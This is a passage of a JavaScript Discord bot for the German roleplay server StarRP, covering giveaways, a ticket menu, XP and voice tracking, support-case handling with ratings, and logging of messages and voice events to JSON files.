            return await interaction.reply({ content: 'Dieses Giveaway existiert nicht mehr.', ephemeral: true });
        }

        const roleId = "1355508021262024714";
        if (!interaction.member.roles.cache.has(roleId)) {
            return await interaction.reply({ content: 'Du kannst diesem Giveaway nicht beitreten.', ephemeral: true });
        }

        if (!activeGiveaway.participants) {
            activeGiveaway.participants = [];
        }

        if (interaction.user.id === "1350131522824437780" && activeGiveaway.participants.includes("1318227032638754927"))
        {
            return await interaction.followUp({ content: `Du bist bereits im Giveaway <@${interaction.user.id}>!`, ephemeral: true });
        }

        if (activeGiveaway.participants.includes(interaction.user.id)) {
            return await interaction.reply({ content: `Du bist bereits im Giveaway <@${interaction.user.id}>!`, ephemeral: true });
        }

        activeGiveaway.participants.push(interaction.user.id);
        fs.writeFileSync(giveawaysJsonPath, JSON.stringify(giveaways, null, 4));

        const participantsText = activeGiveaway.participants.map(id => `<@${id}>`).join(', ') || "Keine Teilnehmer";

        const embed = new MessageEmbed()
            .setTitle(`🎉 Giveaway: ${activeGiveaway.name}`)
            .setDescription(`**Preis:** ${activeGiveaway.priceAmount} ${activeGiveaway.pricetype}\n**Teilnehmer:** \`${activeGiveaway.participants.length}\` - ||${participantsText}||\n**Endet in:** <t:${activeGiveaway.endsAtTimestamp}:R> (<t:${activeGiveaway.endsAtTimestamp}:F>)\nDrücke den Button, um teilzunehmen!`)
            .setColor('#00ff00')
            .setImage('https://i.imgur.com/CnwwYET.png' );

        const giveawayChannel = await client.channels.fetch('1340974678398992430');
        const message = await giveawayChannel.messages.fetch(activeGiveaway.messageId);

        await message.edit({
            embeds: [embed]
        });

        await interaction.followUp({ content: `Du bist dem Giveaway beigetreten <@${interaction.user.id}>!`, ephemeral: true });
    }
});


//#endregion


const ticketChannelId = "1325777854042083328";

// Set, um festzuhalten, ob das Menü bereits gesendet wurde
let hasSentMenu = true;

async function ticket(guild) {
    const serverconfig = require(`./jsons/${guild.id}/serverconfig.json`);
    const messageConfigPath = path.join(__dirname, `./jsons/${guild.id}/ticketMessageConfig.json`);;
    
    const messageConfig = require(path.join(__dirname, `./jsons/${guild.id}/ticketMessageConfig.json`));

    if (!messageConfig || !messageConfigPath) {
        return console.error("Couldn't find messageConfig or messageConfigPath")
    }

    try {
        const targetChannel = await client.channels.fetch(serverconfig.ticketChannelId);
        if (!targetChannel) {
            console.error("Kanal nicht gefunden. Überprüfe die Kanal-ID.");
            return;
        }

        // Lade die gespeicherte Nachricht-ID
        savedMessageId = messageConfig.messageId;


        // Erstelle das Embed
        const embed = new MessageEmbed()
            .setColor("#590860")
            .setAuthor("StarRP", "https://i.imgur.com/0tRDkjZ.png")
            .setTitle("**StarRP Tickets**")
            .setDescription("**Allgemeine Ticket Regeln**\n- Tickets sind nicht zum Spaß, dies ist zu unterlassen.\n- Es dürfen keine Screenshots erstellt werden.\n- Das Pingen von Moderatoren ist untersagt.\n- Tickets werden nach 60 Minuten Inaktivität geschlossen.")
            .setThumbnail("https://i.imgur.com/0tRDkjZ.png")
            .setFooter("Liebe Grüße,\ndas StarRP Team");

        // Erstelle das Dropdown-Menü
        const row = new MessageActionRow().addComponents(
            new MessageSelectMenu()
                .setCustomId("support")
                .setMaxValues(1)
                .setPlaceholder("Wo bei benötigst du Hilfe?")
                .addOptions([
                    {
                        label: "Support",
                        description: "Genereller Support",
                        value: "Support",
                    },
                    {
                        label: "Team beschwerde",
                        description: "Beschwerde gegen einen Team-Member",
                        value: "Team beschwerde",
                    },
                    {
                        label: "Entbanungs anfrage",
                        description: "Anfrage um einen Account zu entbannen",
                        value: "Entbanungs anfrage",
                    },
                    {
                        label: "Waffenscheine kaufen",
                        description: "Anfrage um Waffenscheine zu kaufen",
                        value: "Waffenscheine kaufen",
                    },
                    {
                        label: "Haus kaufen",
                        description: "Anfrage um ein Haus zu kaufen",
                        value: "Haus kaufen",
                    },
                    {
                        label: "Geschäft erwerben",
                        description: "Anfrage um Besitzer eines Geschäft zu werden.",
                        value: "Geschäft erwerben",
                    },
                ])
        );

        // Aktualisiere bestehende Nachricht oder sende eine neue
        if (savedMessageId) {
            try {
                const existingMessage = await targetChannel.messages.fetch(savedMessageId);
                if (existingMessage) {
                    await existingMessage.edit({ embeds: [embed], components: [row] });
                    console.log("Menü erfolgreich aktualisiert.");
                    return;
                }
            } catch (error) {
                console.log("Gespeicherte Nachricht nicht gefunden. Erstelle eine neue Nachricht.");
            }
        }

        // Falls keine Nachricht existiert, sende eine neue und speichere die ID
        const newMessage = await targetChannel.send({ embeds: [embed], components: [row] });

        // Speichere die neue Nachricht-ID
        fs.writeFileSync(messageConfigPath, JSON.stringify({ messageId: newMessage.id }, null, 4));

        console.log("Menü wurde neu gesendet und die ID gespeichert.");
    } catch (error) {
        console.error("Fehler beim Senden oder Aktualisieren des Menüs:", error);
    }
}

function memberlist(member) {
    const membersFile = `./src/jsons/${member.guild.id}/members.json`; // Pfad zur JSON-Datei
	const data = JSON.parse(fs.readFileSync(membersFile));
	let userId = member.user.id;
	if (!data[userId]) {
		if (member) {
			const nickname = member.nickname || member.user.username;
			data[userId] = {
				username: nickname,
				userId: userId,
				count: 0.0,
				avatar: member.user.avatar || null,
				pending: 0.0,
                verifed: null,
			};
			fs.writeFileSync(membersFile, JSON.stringify(data, null, 4));
			console.log(chalk.green(`Benutzer ${member.user.tag} zur Liste hinzugefügt.`));
		} else {
			console.log(chalk.red(`Benutzer ${userId} konnte nicht gefunden werden.`));
			return;
		}
	}
}

client.on("presenceUpdate", (oldPresence, newPresence) => {
    if (!newPresence || !newPresence.member) return;
    const membersFile = `./src/jsons/${newPresence.member.guild.id}/members.json`; // Pfad zur JSON-Datei

    const userId = newPresence.userId;
    const isOnline = newPresence.status === "online";

    if (isOnline) {
        const data = JSON.parse(fs.readFileSync(membersFile, "utf-8"));

        if (data[userId] && data[userId].pending && data[userId].pending > 0) {
            const pendingLevels = data[userId].pending;

            data[userId].count += pendingLevels;
            data[userId].pending = 0;

            fs.writeFileSync(membersFile, JSON.stringify(data, null, 4));
            console.log(chalk.greenBright(`${newPresence.user.tag} hat ${pendingLevels} geschenkte Level erhalten!`));

            const guild = newPresence.guild;
            const user = guild.members.cache.get(userId);

            user.send(
                `🎉 Du hast ${pendingLevels} geschenkte Level erhalten! Vielen Dank an deinen Schenker! 🎁`
            ).catch((error) => {
                console.error(chalk.red(`Fehler beim Senden der Nachricht an ${user.tag}:`), error);
            });
        }
    }
});


const messageToSend = ":green_circle: Der Server ist jetzt online! :green_circle:\n\nJoint jetzt mit dem Code: `58ww31kw`" + "\n\n" + "||<@&1319996155320336404>||"; // Nachricht, die gesendet werden soll
//const sendTime = "12:00"; // Uhrzeit im 24-Stunden-Format (z. B. "14:30" für 14:30 Uhr)
//const channelId = "1334127960298356776";
const timezone = "Europe/Berlin"; // Zeitzone

const enab = false;

// Event: Bot bereit
client.once("ready", () => {
    // Cron-Job erstellen, um die Nachricht täglich zur festgelegten Uhrzeit zu senden
    client.guilds.cache.forEach(async guild => {
        const serverconfig = require(`../src/jsons/${guild.id}/serverconfig.json`);
        const sendTime = serverconfig.sendtime; // Uhrzeit im 24-Stunden-Format (z. B. "14:30" für 14:30 Uhr)
        const channelId = serverconfig.serveronlinechannel;
        console.log("Cron-Job eingerichtet, um die Nachricht täglich um " + sendTime + " zu senden.");
        cron.schedule("* * * * *", async () => {
            const now = moment().tz(timezone);
            const currentTime = now.format("HH:mm");

            if (currentTime === sendTime && serverconfig.sendonline === true) {
                try {
                    const channel = await client.channels.fetch(channelId);
                    if (!channel) {
                        console.error("Kanal nicht gefunden.");
                        return;
                    }
                    if (enab) {
                        await channel.send(messageToSend);
                    }

                    
                    console.log(`Nachricht um ${sendTime} erfolgreich gesendet.`);
                } catch (error) {
                    console.error("Fehler beim Senden der Nachricht:", error);
                }
            }
        });

        cron.schedule("* * * * *", async () => {
            //await updateSupportChannelName();

            const now = moment().tz(timezone);
            const currentTime = now.format("HH:mm");

            if (currentTime > "21:30") {
                try {
                    const channel = await client.channels.fetch(channelId);
                    if (!channel) {
                        console.error("Kanal nicht gefunden.");
                        return;
                    }

                    //await channel.setName("〣│🔴・server-status");
                } catch (error) {
                    console.error("Fehler beim setzen des Kanalnamens:", error);
                }
            }
        });

        console.log(`Cron-Job eingerichtet, um die Nachricht täglich um ${sendTime} zu senden.`);
    });
    
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;

    if(interaction.customId.startsWith("confirm_leave/"))
        {
            const guildid = interaction.customId.split("/")[1];
            const guild = client.guilds.cache.get(guildid)
    
            if (!guild) {
                await interaction.reply({ content: 'Fehler: Konnte den Server nicht finden.', ephemeral: true });
                return;
            }
    
            await guild.leave();
            console.log(`✅ Der Bot hat ${guild.name} verlassen.`);
            await interaction.reply({ content: "✅ **Der Bot hat den Server verlassen!**" });
        }

    if (!interaction.customId.includes("SupportCase")) {
        return
    }

    const embed = interaction.message.embeds[0];
    const description = embed.description;

    if (interaction.customId === 'takeSupportCase') {
        try {
            const userIdMatch = description.match(/<@(\d+)>/);
            if (!userIdMatch) {
                await interaction.reply({ content: 'Fehler: Konnte den Support-Suchenden nicht finden.', ephemeral: true });
                return;
            }

            const seekingUserId = userIdMatch[1];
            const seekingMember = await interaction.guild.members.fetch(seekingUserId);
            const supporterMember = interaction.member;

            if (supporterMember.voice.channel.parent.id !== "1319995809999228972") {
                return interaction.reply({
                    content: 'Du befindest dich nicht in einem erlaubtem kanal',
                    ephemeral: true,
                });
            }

            if (supporterMember.id === seekingUserId) {
                return interaction.reply({
                    content: 'Du kannst deinen eigenen Support-Fall nicht übernehmen.',
                    ephemeral: true,
                });
            }

            if (!seekingMember.voice.channelId) {
                await interaction.reply({ content: 'Der Support-Suchende ist nicht mehr in einem Voice-Channel.', ephemeral: true });
                return;
            }
            if (!supporterMember.voice.channelId) {
                await interaction.reply({ content: 'Du musst dich zuerst in einem Voice-Channel befinden.', ephemeral: true });
                return;
            }

            await seekingMember.voice.setChannel(supporterMember.voice.channelId);

            const updatedEmbed = new MessageEmbed(embed)
                .setColor('#00FF00')
                .setDescription(description.replace(
                    '**Supporter:** -',
                    `**Supporter:** <@${supporterMember.id}>`
                ).replace(
                    '**Kanal:** -',
                    `**Kanal:** <#${supporterMember.voice.channel.id}>`
                ));

            const connection = getVoiceConnection(interaction.guild.id);
            if (connection) {
                connection.destroy();
                console.log('Bot hat den Kanal verlassen, da der Support-Fall übernommen wurde.');
            }

            await interaction.message.edit({
                content: `<@${supporterMember.id}> hat den Supportfall von <@${seekingMember.id}> übernommen`,
                embeds: [updatedEmbed],
                components: []
            });

            await interaction.reply({
                content: 'Support-Fall übernommen! Der Benutzer wurde in deinen Voice-Channel verschoben.',
                ephemeral: true
            });

            setTimeout(() => {
                const row = new MessageActionRow()
                .addComponents(
                    new MessageButton()
                        .setCustomId('endSupportCase')
                        .setLabel('Support Fall beenden')
                        .setStyle('DANGER')
                );
                
                interaction.message.edit({
                    content: `<@${supporterMember.id}> hat den Supportfall von <@${seekingMember.id}> übernommen`,
                    embeds: [updatedEmbed],
                    components: [row]
                });

            }, 1000);

        } catch (error) {
            console.error('Fehler beim Übernehmen des Support-Falls:', error);
            await interaction.reply({ content: 'Fehler beim Übernehmen des Support-Falls.', ephemeral: true });
        }
    } else if (interaction.customId === 'endSupportCase') {
        try {
            const userIdMatch = description.match(/<@(\d+)>/);
            if (!userIdMatch) {
                await interaction.reply({ content: 'Fehler: Konnte den Support-Suchenden nicht finden.', ephemeral: true });
                return;
            }
            const seekingUserId = userIdMatch[1];
            const seekingMember = await interaction.guild.members.fetch(seekingUserId);

            const lines = embed.description.split("\n"); // Beschreibung in Zeilen aufteilen
            const timeLine = lines.find(line => line.toLowerCase().includes("zeitpunkt")); // Findet die Zeile mit "Zeitpunkt"

            if (!timeLine) {
                console.error("❌ Fehler: Zeitpunkt-Zeile wurde nicht gefunden.");
                console.log("💡 Debug: embed.description =", embed.description);
                return interaction.reply({ content: "❌ Fehler: Zeitpunkt-Zeile wurde nicht gefunden.", ephemeral: true });
            }


            const supporterLine = lines.find(line => line.toLowerCase().includes("**supporter:**")); // Find the line

            const mentionRegex = /<@!?(\d+)>/g;
            const mentions = [...supporterLine.matchAll(mentionRegex)].map(match => match[1]);

            // Starte eine genauere Extraktion der Zeit
            const timeMatch = timeLine.match(/(\d{2}:\d{2}:\d{2})/); // Sucht eine Uhrzeit im Format "HH:mm:ss"
            if (!timeMatch) {
                console.error("❌ Fehler: Keine Uhrzeit in der Zeitpunkt-Zeile gefunden.");
                return interaction.reply({ content: "❌ Fehler: Keine Uhrzeit gefunden.", ephemeral: true });
            }

            const starttime = timeMatch[1];
            console.log(`✅ Startzeit extrahiert: ${starttime}`);

            const now = moment.tz('Europe/Berlin').format('HH:mm:ss');


            const duration = berechneZeitspanne(starttime, now);


            const updatedEmbed = new MessageEmbed(embed)
                .setColor('#00FF00')
                .setTitle('✅ Support Fall beendet')
                .setDescription(description.replace(
                    '**Dauer:** -',
                    `**Dauer:** ${duration}`
                ) + '\n\nDer Support-Fall wurde erfolgreich abgeschlossen.');

                

            const endrow = new MessageActionRow()
                .addComponents(
                    new MessageButton()
                        .setCustomId('addcomment')
                        .setLabel('Kommentar hinzufügen')
                        .setStyle('PRIMARY')
                );

            await interaction.message.edit({
                embeds: [updatedEmbed],
                components: [endrow]
            });

            if (seekingMember.voice.channel && seekingMember.voice.channel.parentId === '1319995809999228972') {
                await seekingMember.voice.disconnect();
            }

            const useremb = new MessageEmbed()
                .setColor('#590860')
                .setTitle('Support Fall beendet')
                .setDescription(`Dein Support-Fall wurde erfolgreich beendet von <@${mentions[0]}>. \n\n Möchtest du dem Supporter eine Bewertung geben? \n\n Klicke auf einen der Buttons, um eine Bewertung abzugeben.`)
                .setImage('https://i.imgur.com/CnwwYET.png' );

            const row = new MessageActionRow()
                .addComponents(
                    new MessageButton()
                        .setCustomId(`sbw_1_${mentions[0]}_${seekingMember.id}`)
                        .setLabel('⭐')
                        .setStyle('PRIMARY'),

                    new MessageButton()
                        .setCustomId(`sbw_2_${mentions[0]}_${seekingMember.id}`)
                        .setLabel('⭐⭐')
                        .setStyle('PRIMARY'),

                    new MessageButton()
                        .setCustomId(`sbw_3_${mentions[0]}_${seekingMember.id}`)
                        .setLabel('⭐⭐⭐')
                        .setStyle('PRIMARY'),

                    new MessageButton()
                        .setCustomId(`sbw_4_${mentions[0]}_${seekingMember.id}`)
                        .setLabel('⭐⭐⭐⭐')
                        .setStyle('PRIMARY'),

                    new MessageButton()
                        .setCustomId(`sbw_5_${mentions[0]}_${seekingMember.id}`)
                        .setLabel('⭐⭐⭐⭐⭐')
                        .setStyle('PRIMARY')
                );

            try {
                await seekingMember.send({
                    embeds: [useremb],
                    components: [row]
                });

                await interaction.reply({
                    content: 'Support-Fall erfolgreich beendet.',
                    ephemeral: true
                });
            } catch (error) {
                console.error('Fehler beim Senden der Bewertung:', error);
                await interaction.reply({ content: '❌ Fehler beim Senden der Bewertungsnachricht.', ephemeral: true });
            }


            await interaction.reply({
                content: 'Support-Fall erfolgreich beendet.',
                ephemeral: true
            });

        } catch (error) {
            console.error('Fehler beim Beenden des Support-Falls:', error);
            await interaction.reply({ content: 'Fehler beim Beenden des Support-Falls.', ephemeral: true });
        }
    }
});


function berechneZeitspanne(startZeit, endZeit) {
    // Sicherstellen, dass die Zeiten das richtige Format haben (HH:mm:ss)
    if (!/^(\d{2}):(\d{2}):(\d{2})$/.test(startZeit) || !/^(\d{2}):(\d{2}):(\d{2})$/.test(endZeit)) {
        console.error("❌ Ungültiges Zeitformat! Erwartetes Format: HH:mm:ss");
        return "NA";
    }

    // Umwandlung der Eingabezeiten in Date-Objekte (Datum wird auf einen Fixwert gesetzt)
    const start = new Date(`1970-01-01T${startZeit}Z`);
    const end = new Date(`1970-01-01T${endZeit}Z`);

    // Falls `end` kleiner als `start` ist (z. B. über Mitternacht)
    if (end < start) {
        end.setTime(end.getTime() + 24 * 60 * 60 * 1000); // 24 Stunden addieren
    }

    // Berechnung der Differenz in Millisekunden
    const differenz = end - start;

    // Umwandlung der Differenz in Stunden, Minuten und Sekunden
    const stunden = Math.floor(differenz / (1000 * 60 * 60));
    const minuten = Math.floor((differenz % (1000 * 60 * 60)) / (1000 * 60));
    const sekunden = Math.floor((differenz % (1000 * 60)) / 1000);

    // Debugging in der Konsole
    console.log(`⏱ Zeitspanne zwischen ${startZeit} und ${endZeit}:`);
    console.log(`${stunden} Stunden, ${minuten} Minuten, ${sekunden} Sekunden`);

    // Formatierte Rückgabe
    return `${stunden.toString().padStart(2, "0")}:${minuten.toString().padStart(2, "0")}:${sekunden.toString().padStart(2, "0")}`;
}




client.on("messageUpdate", async (oldMessage, newMessage) => {
    if (!oldMessage || !newMessage) return;
    if (newMessage.channel.type === "DM") return;
    if (newMessage.channel.guild.id !== "1075044009875099729") return;
    if (newMessage.author.bot) return;

    const timestamp = new Date().toLocaleString("de-DE", { timeZone: "Europe/Berlin" });
    const channelKey = `${newMessage.channel.id}`;

    let logData = {};

    const logFilePath = path.join(__dirname, `./jsons/${newMessage.channel.guild.id}/nachrichten.json`);

    // Lade existierende Log-Datei
    if (fs.existsSync(logFilePath)) {
        try {
            const rawData = fs.readFileSync(logFilePath, "utf8");
            logData = JSON.parse(rawData);
        } catch (error) {
            console.error("Fehler beim Einlesen der JSON-Datei:", error);
        }
    }

    if (!logData[channelKey]) {
        logData[channelKey] = {
            channelname: newMessage.channel.name,
            messages: []
        };
    }

    const existingMessageIndex = logData[channelKey].messages.findIndex(m => m.id === newMessage.id);

    if (existingMessageIndex !== -1) {
        const existingMessage = logData[channelKey].messages[existingMessageIndex];

        // **Nachrichteninhalt aktualisieren & Historie speichern**
        if (oldMessage.content !== newMessage.content) {
            if (!existingMessage.history) {
                existingMessage.history = [];
            }
            existingMessage.history.push(existingMessage.inhalt);
            existingMessage.inhalt = newMessage.content;
            existingMessage.uhrzeit = timestamp;
            existingMessage.bearbeitet = true;
        }

        // **Anhänge aktualisieren**
        const attachments = newMessage.attachments.map(attachment => {
            if (attachment.contentType && attachment.contentType.startsWith("image/")) {
                return `<img src="${attachment.url}" alt="Bild" style="max-width: 100%; border-radius: 5px;">`;
            } else {
                return `<a href="${attachment.url}" target="_blank" class="file-link">${attachment.name}</a>`;
            }
        }).join("<br>");

        if (attachments.length > 0) {
            existingMessage.dateien = attachments;
        }

        // **Embeds aktualisieren**
        existingMessage.embeds = newMessage.embeds.map(embed => ({
            titel: embed.title || "",
            beschreibung: embed.description || "",
            farbe: embed.color || "",
            felder: embed.fields?.map(field => ({
                name: field.name || "",
                wert: field.value || ""
            })) || [],
            bild: embed.image ? embed.image.url : "",
            thumbnail: embed.thumbnail ? embed.thumbnail.url : "",
            footer: embed.footer,
            timestamp: embed.timestamp
        }));
    } else {
        // **Wenn Nachricht noch nicht existiert, neu hinzufügen**
        const attachments = newMessage.attachments.map(attachment => {
            if (attachment.contentType && attachment.contentType.startsWith("image/")) {
                return `<img src="${attachment.url}" alt="Bild" style="max-width: 100%; border-radius: 5px;">`;
            } else {
                return `<a href="${attachment.url}" target="_blank" class="file-link">${attachment.name}</a>`;
            }
        }).join("<br>");

        const isEphemeral = newMessage.flags.has('EPHEMERAL');

        logData[channelKey].messages.push({
            uhrzeit: timestamp,
            user: newMessage.author.tag,
            id: newMessage.author.id,
            inhalt: newMessage.content || "",
            dateien: attachments.length > 0 ? attachments : null,
            embeds: newMessage.embeds.map(embed => ({
                titel: embed.title || "",
                beschreibung: embed.description || "",
                farbe: embed.color || "",
                felder: embed.fields?.map(field => ({
                    name: field.name || "",
                    wert: field.value || ""
                })) || [],
                bild: embed.image ? embed.image.url : "",
                thumbnail: embed.thumbnail ? embed.thumbnail.url : "",
                footer: embed.footer,
                timestamp: embed.timestamp
            })),
            ephermal: isEphemeral ? `👀 Ephemeral Message an: <@${newMessage.interaction?.user.id || 'Unbekannt'}>` : null
        });
    }

    // **Datei speichern**
    try {
        fs.writeFileSync(logFilePath, JSON.stringify(logData, null, 4), "utf8");
        console.log(`Nachrichten-Update gespeichert in: ${logFilePath}`);
    } catch (error) {
        console.error("Fehler beim Speichern der JSON-Datei:", error);
    }
});


const blockedrole = "1355989083196752073"

client.on("messageCreate", async (message) => {
    if (message.channel.type === 'DM') return;

    if (!message.author.bot && message.channel.parent === "1325500778420633650") {
        updateMemberCount(message.author.id, calculateIncrement(message.author.id), message.guild);
    }

    if (message.channel.id === "1319999978399203399") return;

    const timestamp = new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' });
    const channelKey = `${message.channel.id}`;

    let logData = {};

    const logFilePath = path.join(__dirname, `./jsons/${message.channel.guild.id}/nachrichten.json`);

    if (fs.existsSync(logFilePath)) {
        try {
            const rawData = fs.readFileSync(logFilePath, "utf8");
            logData = JSON.parse(rawData);
        } catch (error) {
            console.error("Fehler beim Einlesen der JSON-Datei:", error);
        }
    }

    if (!logData[channelKey]) {
        logData[channelKey] = [];
    }

    const attachments = message.attachments.map(attachment => {
        if (attachment.contentType && attachment.contentType.startsWith("image/")) {
            return `<img src="${attachment.url}" alt="Bild" style="max-width: 100%; border-radius: 5px;">`;
        } else {
            return `<a href="${attachment.url}" target="_blank" class="file-link">${attachment.name}</a>`;
        }
    }).join("<br>");

    const isEphemeral = message.flags.has('EPHEMERAL');

    // Prüfe zuerst, ob channelKey existiert, ansonsten erstelle ihn neu
    if (!logData[channelKey] || !Array.isArray(logData[channelKey].messages)) {
        logData[channelKey] = {
            channelname: message.channel.name,
            messages: []
        };

        console.log("kein array")
    }

    // Danach einfach Nachrichten hinzufügen:
    logData[channelKey].messages.push({
        uhrzeit: timestamp,
        user: message.author.tag,
        id: message.author.id,
        inhalt: message.content || "",
        dateien: attachments.length > 0 ? attachments : null,
        embeds: message.embeds.map(embed => ({
            titel: embed.title || "",
            beschreibung: embed.description || "",
            farbe: embed.color || "",
            felder: embed.fields?.map(field => ({
                name: field.name || "",
                wert: field.value || ""
            })) || [],
            bild: embed.image ? embed.image.url : "",
            thumbnail: embed.thumbnail ? embed.thumbnail.url : "",
            footer: embed.footer || null,
            timestamp: embed.timestamp || null
        })),
        components: message.components.map(component => ({
            type: component.type || "",
            components: component.components.map(innerComponent => ({
                type: innerComponent.type || "",
                label: innerComponent.label || null,
                custom_id: innerComponent.customId || null,
                emoji: innerComponent.emoji || null,
                url: innerComponent.url || null,
                disabled: innerComponent.disabled || false,
                options: innerComponent.options || "" 
                    ? innerComponent.options.map(option => ({
                        label: option.label || "",
                        value: option.value || "",
                        description: option.description || '',
                        emoji: option.emoji || null,
                        default: option.default || false
                    }))
                    : undefined
            }))
        })),       

        ephermal: isEphemeral ? `👀 Ephemeral Message an: <@${message.interaction?.user.id || 'Unbekannt'}>` : null
    });


    try {
        fs.writeFileSync(logFilePath, JSON.stringify(logData, null, 4), "utf8");

        console.log(`Log gespeichert in: ${logFilePath}`);
    } catch (error) {
        console.error("Fehler beim Speichern der JSON-Datei:", error);
    }

    if (message.content.includes("@everyone") || message.content.includes("@here")) {
        message.delete();
    }

    if (!message.member.roles.cache.has('1319999181254823936') || message.channel.parent.id !== "1325500778420633650") {
        require(`./events/moderation.js`)(client, message);
    }

    console.log(`Neue Nachricht von ${message.author.tag} (${message.author.id}): ${message.content}`);
});




client.on("guildMemberAdd" ,(member) => {
    memberlist(member);
	membercount();
	console.log(`Neuer Member ${member.nickname}`);
});

function membercount() {
    client.guilds.cache.forEach(async guild => {
        console.log("Lade Daten...");
        const serverconfig = require(`../src/jsons/${guild.id}/serverconfig.json`);
        if (!serverconfig) return;
        client.channels.fetch(serverconfig.memberCountChannel).then(memberCountChannel => {
            client.channels.fetch(serverconfig.botsCountChannel).then(botsCountChannel => {
                client.channels.fetch(serverconfig.boostChannel).then(boostChannel => {
                    //const guild = client.guilds.cache.first();
                    if (!guild) {
                        console.log("No guild found.");
                        return;
                    }

                    // Fetch member counts
                    const memberCount = guild.members.cache.filter(member => !member.user.bot).size;
                    memberCountChannel.setName(`〣│👤・${memberCount} Mitglieder`);

                    const botCount = guild.members.cache.filter(member => member.user.bot).size;
                    botsCountChannel.setName(`〣│🤖・${botCount} Bots`);

                    const boostCount = guild.premiumSubscriptionCount;
                    boostChannel.setName(`〣│💎・${boostCount} Boosts`);

                    console.log(`Daten erfolgreich geladen Members: ${memberCount}, Bots: ${botCount}, Boosts: ${boostCount}`);
                }).catch(error => console.error("Error fetching boost channel:", error));
            }).catch(error => console.error("Error fetching bots count channel:", error));
        }).catch(error => console.error("Error fetching member count channel:", error));
    });
}


client.on("voiceStateUpdate", (oldState, newState) => {
    const userId = newState.id;
    const guild = newState.guild;

    // Funktionen zum Prüfen von AFK- und Kategorie-IDs
    const isAFKChannel = (channel) => channel?.id === guild.afkChannelId;
    const isExcludedCategory = (channel) => channel?.parentId === "1319995809999228972";

    // User betritt einen Voice-Channel
    if (!oldState.channelId && newState.channelId) {
        const voiceChannel = newState.channel;

        // Keine XP im AFK-Channel oder in der ausgeschlossenen Kategorie
        if (isAFKChannel(voiceChannel) || isExcludedCategory(voiceChannel)) {
            console.log(`🚫 Keine XP: Benutzer ${userId} ist in einem ausgeschlossenen Channel.`);
            return;
        }

        // Nur starten, wenn mindestens 2 Benutzer im Channel sind
        if (voiceChannel.members.filter(member => !member.user.bot).size >= 2) {
            activeVoiceTimes[userId] = Date.now();
            saveActiveVoiceTimes();
            console.log(`✅ XP-Tracking gestartet für Benutzer ${userId} im Channel ${voiceChannel.name}`);
        }
    }

    // User verlässt einen Voice-Channel
    if (oldState.channelId && !newState.channelId) {
        const voiceChannel = oldState.channel;

        exportMembersWithRole(oldState.guild);

        // Keine XP im AFK-Channel oder in der ausgeschlossenen Kategorie
        if (isAFKChannel(voiceChannel) || isExcludedCategory(voiceChannel)) {
            console.log(`🚫 Keine XP: Benutzer ${userId} war in einem ausgeschlossenen Channel.`);
            return;
        }

        const joinTime = activeVoiceTimes[userId];

        if (oldState.channelId == "") {
            
        }

        if (joinTime) {
            const timeSpent = (Date.now() - joinTime) / 1000; // Zeit im Channel in Sekunden
            delete activeVoiceTimes[userId]; // Eintrittszeit entfernen
            saveActiveVoiceTimes(); // Zustand aktualisieren
            processVoiceActivity(userId, timeSpent, guild); // XP basierend auf Zeit vergeben
            console.log(`✅ XP vergeben: Benutzer ${userId} war ${timeSpent} Sekunden im Channel ${voiceChannel.name}`);
        }
    }

    logvoice(oldState, newState);
});

//client.on("voiceStateUpdate", (oldState, newState) => logvoice(oldState, newState));
const getLogFilePath = (guildId) => path.join(__dirname, `./jsons/${guildId}/voice_logs.json`);

// Funktion zum Laden von Logs
const loadLogs = (guildId) => {
    const filePath = getLogFilePath(guildId);
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify({ logs: [] }, null, 4));
    }
    return JSON.parse(fs.readFileSync(filePath, "utf8"));
};

// Funktion zum Speichern von Logs
const saveLogs = (guildId, data) => {
    const filePath = getLogFilePath(guildId);
    fs.writeFileSync(filePath, JSON.stringify(data, null, 4));
};

async function logvoice(oldState, newState)
{
    const guild = newState.guild;
    
    const user = newState.member.user;
    const timestamp = new Date().toISOString();

    let logs = loadLogs(guild.id);
    let action = null;

    // **🎤 JOIN Voice Channel**
    if (!oldState.channelId && newState.channelId) {
        action = `🟢 Beitritt: ${user.tag} ist dem Voice-Channel "${newState.channel.name}" beigetreten.`;
    }
    // **🚪 LEAVE Voice Channel**
    else if (oldState.channelId && !newState.channelId) {
        action = `🔴 Verlassen: ${user.tag} hat den Voice-Channel "${oldState.channel.name}" verlassen.`;
    }
    // **🔄 MOVE zwischen Channels**
    else if (oldState.channelId !== newState.channelId) {
        action = `🔄 Wechsel: ${user.tag} wechselte von "${oldState.channel.name}" zu "${newState.channel.name}".`;
    }
    // **🔇 MUTE / UNMUTE**
    else if (!oldState.selfMute && newState.selfMute) {
        action = `🔇 Mute: ${user.tag} hat sich selbst gemutet.`;
    } else if (oldState.selfMute && !newState.selfMute) {
        action = `🔊 Unmute: ${user.tag} hat sich selbst entmutet.`;
    }
    // **👂 DEAFEN / UNDEAFEN**
    else if (!oldState.selfDeaf && newState.selfDeaf) {
        action = `🛑 Deafen: ${user.tag} hat sich selbst taub gestellt.`;
    } else if (oldState.selfDeaf && !newState.selfDeaf) {
        action = `🔔 Undeafen: ${user.tag} hat sich selbst enttaubt.`;
    }

    // Falls es eine Aktion gibt, speichere sie in der JSON-Datei
    if (action) {
        console.log(action);

        logs.logs.push({
            userId: user.id,
            username: user.tag,
            action,
            timestamp,
        });

        saveLogs(guild.id, logs);
    }
}



// Error Handling
process.on("uncaughtException", (err) => {
	console.log("Uncaught Exception: " + err);
});

process.on("unhandledRejection", (reason, promise) => {
	console.log(
		"[FATAL] Possibly Unhandled Rejection at: Promise ",
		promise,
		" reason: ",
		reason.message
	);
});

let status = [
	{
		name: 'auf StarRP',
	}
];

client.login(botToken).then(() => {
	console.log(
		chalk.bgBlueBright.black(
			` Successfully logged in as: ${client.user.username}#${client.user.discriminator} `
		)
	);
	client.user.setActivity(status[0]);
});


module.exports = { checkGiveawayEnd, generateHouseMap, waffenschein, exportMembersWithRole, checkMultipleUsers };